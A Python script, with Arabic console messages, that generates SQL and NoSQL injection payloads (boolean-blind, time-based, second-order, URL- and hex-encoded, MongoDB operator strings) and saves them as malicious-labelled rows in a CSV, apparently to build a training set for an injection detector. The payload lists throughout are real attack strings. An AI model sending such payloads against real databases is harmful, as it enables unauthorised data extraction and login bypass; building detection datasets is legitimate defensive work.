import pandas as pd
import random
import urllib.parse

print("=" * 80)
print("توليد أنماط SQL Injection جديدة")
print("=" * 80)

new_patterns = []

# 1. Blind SQL Injection (Boolean-based)
print("\n1️⃣  توليد Blind SQL Injection (Boolean-based)...")

boolean_blind_patterns = [
    # MySQL
    "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
    "' AND (SELECT SUBSTRING(@@version,1,1))='M' --",
    "' AND (SELECT LENGTH(database()))=8 --",
    "' AND (SELECT ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables LIMIT 1)>100 --",
    "' AND (SELECT ASCII(SUBSTRING(column_name,1,1)) FROM information_schema.columns LIMIT 1)>100 --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>10 --",
    "' AND (SELECT SUBSTRING(user(),1,1))='r' --",
    "' AND (SELECT SUBSTRING(database(),1,1))='t' --",
    
    # PostgreSQL
    "' AND (SELECT SUBSTRING(version(),1,1))='P' --",
    "' AND (SELECT LENGTH(current_database()))=10 --",
    "' AND (SELECT ASCII(SUBSTRING(current_user,1,1)))>100 --",
    "' AND (SELECT COUNT(*) FROM pg_tables)>5 --",
    
    # MSSQL
    "' AND (SELECT SUBSTRING(@@version,1,1))='M' --",
    "' AND (SELECT LEN(DB_NAME()))=8 --",
    "' AND (SELECT ASCII(SUBSTRING(DB_NAME(),1,1)))>100 --",
    "' AND (SELECT COUNT(*) FROM sysobjects)>10 --",
    
    # Oracle
    "' AND (SELECT SUBSTRING(banner,1,1) FROM v$version WHERE rownum=1)='O' --",
    "' AND (SELECT LENGTH(user) FROM dual)=5 --",
]

# توليد متغيرات من الأنماط
for pattern in boolean_blind_patterns:
    # تغيير الأرقام
    for i in range(3):
        new_pattern = pattern.replace('5', str(random.randint(1, 9)))
        new_pattern = new_pattern.replace('8', str(random.randint(5, 15)))
        new_pattern = new_pattern.replace('10', str(random.randint(5, 20)))
        new_patterns.append((new_pattern, 1))

print(f"   ✅ تم توليد {len([p for p in new_patterns if 'AND (SELECT' in p[0]])} نمط Boolean-based")

# 2. Blind SQL Injection (Time-based)
print("\n2️⃣  توليد Blind SQL Injection (Time-based)...")

time_based_patterns = [
    # MySQL
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "' AND IF((SELECT SUBSTRING(@@version,1,1))='5', SLEEP(5), 0) --",
    "' AND IF((SELECT LENGTH(database()))=8, SLEEP(5), 0) --",
    "' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10, SLEEP(5), 0) --",
    
    # PostgreSQL
    "' AND (SELECT * FROM (SELECT(pg_sleep(5)))a) --",
    "' AND (SELECT CASE WHEN (SELECT SUBSTRING(version(),1,1))='P' THEN pg_sleep(5) ELSE pg_sleep(0) END) --",
    "' AND (SELECT CASE WHEN (SELECT LENGTH(current_database()))=10 THEN pg_sleep(5) ELSE pg_sleep(0) END) --",
    
    # MSSQL
    "' AND (SELECT * FROM (SELECT(WAITFOR DELAY '0:0:5'))a) --",
    "' AND IF((SELECT SUBSTRING(@@version,1,1))='M', WAITFOR DELAY '0:0:5', 0) --",
    "' AND IF((SELECT LEN(DB_NAME()))=8, WAITFOR DELAY '0:0:5', 0) --",
]

for pattern in time_based_patterns:
    # تغيير الأرقام
    for i in range(3):
        new_pattern = pattern.replace('5', str(random.randint(2, 10)))
        new_pattern = new_pattern.replace('8', str(random.randint(5, 15)))
        new_pattern = new_pattern.replace('10', str(random.randint(5, 20)))
        new_patterns.append((new_pattern, 1))

print(f"   ✅ تم توليد {len([p for p in new_patterns if 'SLEEP' in p[0] or 'pg_sleep' in p[0] or 'WAITFOR' in p[0]])} نمط Time-based")

# 3. Second-order SQL Injection
print("\n3️⃣  توليد Second-order SQL Injection...")

second_order_patterns = [
    "admin'--",
    "admin' OR '1'='1",
    "user' OR '1'='1'--",
    "test' UNION SELECT NULL,NULL--",
    "admin'/**/OR/**/1=1--",
    "user@example.com' OR '1'='1",
    "name' OR '1'='1'--",
    "value' UNION SELECT 1,2,3--",
    "data' OR '1'='1'/*",
    "input' OR '1'='1'#",
]

for pattern in second_order_patterns:
    # إضافة متغيرات
    for prefix in ['', 'user', 'admin', 'test', 'value']:
        if prefix:
            if "'" in pattern:
                parts = pattern.split("'")
                new_pattern = prefix + "'" + parts[-1]
            else:
                new_pattern = prefix + "'" + pattern
        else:
            new_pattern = pattern
        new_patterns.append((new_pattern, 1))

second_order_count = len([p for p in new_patterns if "'--" in p[0] or "' OR" in p[0]])
print(f"   ✅ تم توليد {second_order_count} نمط Second-order")

# 4. SQL Injection مع ترميز مختلف
print("\n4️⃣  توليد SQL Injection مع ترميز مختلف...")

base_patterns = [
    "' OR 1=1 --",
    "' UNION SELECT 1,2,3 --",
    "' OR '1'='1",
    "' AND 1=1 --",
    "admin' OR 1=1--",
    "' OR 1=1#",
]

# URL Encoding
for pattern in base_patterns:
    encoded = urllib.parse.quote(pattern)
    new_patterns.append((encoded, 1))
    # Double encoding
    double_encoded = urllib.parse.quote(encoded)
    new_patterns.append((double_encoded, 1))

# Hex Encoding
hex_patterns = [
    "0x27 OR 0x31=0x31",  # ' OR 1=1
    "CHAR(39) OR CHAR(49)=CHAR(49)",  # ' OR 1=1
    "0x53454C454354",  # SELECT in hex
]

for pattern in hex_patterns:
    new_patterns.append((pattern, 1))

# Unicode Encoding
unicode_patterns = [
    "%u0027 OR 1=1",  # ' OR 1=1
    "\\u0027 OR 1=1",  # ' OR 1=1
]

for pattern in unicode_patterns:
    new_patterns.append((pattern, 1))

print(f"   ✅ تم توليد {len([p for p in new_patterns if '%' in p[0] or '0x' in p[0] or 'CHAR(' in p[0]])} نمط مع ترميز")

# 5. NoSQL Injection
print("\n5️⃣  توليد NoSQL Injection...")

nosql_patterns = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.username == this.password"}',
    '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"$where": "this.username.length > 0"}',
]

for pattern in nosql_patterns:
    new_patterns.append((pattern, 1))

print(f"   ✅ تم توليد {len([p for p in new_patterns if '$' in p[0] or 'where' in p[0].lower()])} نمط NoSQL")

# إزالة التكرار
unique_patterns = list(set(new_patterns))
print(f"\n📊 إجمالي الأنماط المولدة (بعد إزالة التكرار): {len(unique_patterns):,}")

# حفظ الأنماط الجديدة
new_df = pd.DataFrame(unique_patterns, columns=['Query', 'Label'])
output_file = 'dataset/New_SQLi_Patterns.csv'
new_df.to_csv(output_file, index=False)
print(f"✅ تم حفظ الأنماط الجديدة في: {output_file}")

print(f"\n{'='*80}")
print("✅ انتهى توليد الأنماط الجديدة!")
print(f"{'='*80}")

